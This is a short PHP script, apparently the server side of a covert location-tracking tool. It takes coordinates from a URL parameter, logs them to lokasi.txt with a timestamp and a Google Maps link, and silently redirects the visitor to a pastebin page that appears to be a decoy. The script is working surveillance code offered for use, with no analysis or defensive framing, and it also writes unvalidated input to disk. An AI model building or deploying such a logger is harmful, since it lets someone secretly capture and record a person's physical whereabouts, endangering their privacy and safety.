<?php
$file = fopen("lokasi.txt", "w") or die("Unable to open file!");
$maps = "https://www.google.com/maps/@".$_GET['id']."z";
$lokasi = $_GET['id']. " || terakhir update ".date('d-m-Y H:i:s')." || Maps:".$maps;
fwrite($file, $lokasi);
fclose($file);

header("Location:https://pastebin.com/raw/HuZHPxrQ");
?>